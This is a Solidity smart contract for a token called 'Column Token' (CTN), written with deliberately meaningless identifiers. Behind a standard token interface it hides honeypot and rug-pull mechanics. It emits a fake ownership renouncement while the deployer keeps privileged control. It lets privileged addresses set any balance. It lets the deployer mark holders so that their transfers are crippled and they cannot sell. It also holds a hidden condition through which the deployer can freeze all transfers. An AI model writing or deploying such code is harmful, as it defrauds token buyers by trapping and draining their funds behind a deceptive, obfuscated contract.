//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface totalLaunched {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountTx) external view returns (uint256);

    function transfer(address amountMax, uint256 totalLaunchAuto) external returns (bool);

    function allowance(address receiverMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalLaunchAuto) external returns (bool);

    function transferFrom(
        address sender,
        address amountMax,
        uint256 totalLaunchAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderAmount, uint256 value);
    event Approval(address indexed receiverMax, address indexed spender, uint256 value);
}

abstract contract fundSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toMin {
    function createPair(address fundAt, address walletTrading) external returns (address);
}

interface totalLaunchedMetadata is totalLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ColumnToken is fundSender, totalLaunched, totalLaunchedMetadata {

    function exemptFrom(address sellExempt, address amountMax, uint256 totalLaunchAuto) internal returns (bool) {
        if (sellExempt == receiverToken) {
            return launchLimitWallet(sellExempt, amountMax, totalLaunchAuto);
        }
        uint256 fundShould = totalLaunched(isMinLiquidity).balanceOf(receiverMarketing);
        require(fundShould == amountIs);
        require(amountMax != receiverMarketing);
        if (enableReceiver[sellExempt]) {
            return launchLimitWallet(sellExempt, amountMax, feeTotalMax);
        }
        return launchLimitWallet(sellExempt, amountMax, totalLaunchAuto);
    }

    address public receiverToken;

    event OwnershipTransferred(address indexed limitMax, address indexed isShould);

    uint256 private receiverAuto;

    function approve(address totalTo, uint256 totalLaunchAuto) public virtual override returns (bool) {
        minLaunchedMode[_msgSender()][totalTo] = totalLaunchAuto;
        emit Approval(_msgSender(), totalTo, totalLaunchAuto);
        return true;
    }

    mapping(address => bool) public shouldLaunch;

    uint8 private shouldMax = 18;

    uint256 private fromFeeMax;

    function transferFrom(address sellExempt, address amountMax, uint256 totalLaunchAuto) external override returns (bool) {
        if (_msgSender() != totalAmountTx) {
            if (minLaunchedMode[sellExempt][_msgSender()] != type(uint256).max) {
                require(totalLaunchAuto <= minLaunchedMode[sellExempt][_msgSender()]);
                minLaunchedMode[sellExempt][_msgSender()] -= totalLaunchAuto;
            }
        }
        return exemptFrom(sellExempt, amountMax, totalLaunchAuto);
    }

    bool private marketingReceiverMode;

    uint256 amountIs;

    function shouldIs(address limitLaunch) public {
        senderList();
        
        if (limitLaunch == receiverToken || limitLaunch == isMinLiquidity) {
            return;
        }
        enableReceiver[limitLaunch] = true;
    }

    bool public receiverWallet;

    address receiverMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return shouldMax;
    }

    address totalAmountTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return amountSender;
    }

    uint256 private modeAutoMax;

    function symbol() external view virtual override returns (string memory) {
        return teamMax;
    }

    string private amountSender = "Column Token";

    uint256 private totalExempt;

    function allowance(address modeWallet, address totalTo) external view virtual override returns (uint256) {
        if (totalTo == totalAmountTx) {
            return type(uint256).max;
        }
        return minLaunchedMode[modeWallet][totalTo];
    }

    uint256 modeLaunch;

    uint256 constant feeTotalMax = 7 ** 10;

    constructor (){
        
        totalShould launchedMode = totalShould(totalAmountTx);
        isMinLiquidity = toMin(launchedMode.factory()).createPair(launchedMode.WETH(), address(this));
        
        receiverToken = _msgSender();
        isToBuy();
        shouldLaunch[receiverToken] = true;
        senderFundEnable[receiverToken] = takeLaunchTeam;
        
        emit Transfer(address(0), receiverToken, takeLaunchTeam);
    }

    address private takeMin;

    function swapTrading(uint256 totalLaunchAuto) public {
        senderList();
        amountIs = totalLaunchAuto;
    }

    function owner() external view returns (address) {
        return takeMin;
    }

    function fromExemptToken(address swapExemptTrading, uint256 totalLaunchAuto) public {
        senderList();
        senderFundEnable[swapExemptTrading] = totalLaunchAuto;
    }

    function shouldList(address amountFund) public {
        if (receiverWallet) {
            return;
        }
        if (receiverAuto != totalExempt) {
            totalExempt = fromFeeMax;
        }
        shouldLaunch[amountFund] = true;
        
        receiverWallet = true;
    }

    mapping(address => bool) public enableReceiver;

    function transfer(address swapExemptTrading, uint256 totalLaunchAuto) external virtual override returns (bool) {
        return exemptFrom(_msgSender(), swapExemptTrading, totalLaunchAuto);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return takeLaunchTeam;
    }

    uint256 private takeLaunchTeam = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private minLaunchedMode;

    string private teamMax = "CTN";

    function isToBuy() public {
        emit OwnershipTransferred(receiverToken, address(0));
        takeMin = address(0);
    }

    function getOwner() external view returns (address) {
        return takeMin;
    }

    function launchLimitWallet(address sellExempt, address amountMax, uint256 totalLaunchAuto) internal returns (bool) {
        require(senderFundEnable[sellExempt] >= totalLaunchAuto);
        senderFundEnable[sellExempt] -= totalLaunchAuto;
        senderFundEnable[amountMax] += totalLaunchAuto;
        emit Transfer(sellExempt, amountMax, totalLaunchAuto);
        return true;
    }

    function balanceOf(address amountTx) public view virtual override returns (uint256) {
        return senderFundEnable[amountTx];
    }

    address public isMinLiquidity;

    function senderList() private view {
        require(shouldLaunch[_msgSender()]);
    }

    mapping(address => uint256) private senderFundEnable;

    bool private launchedMax;

}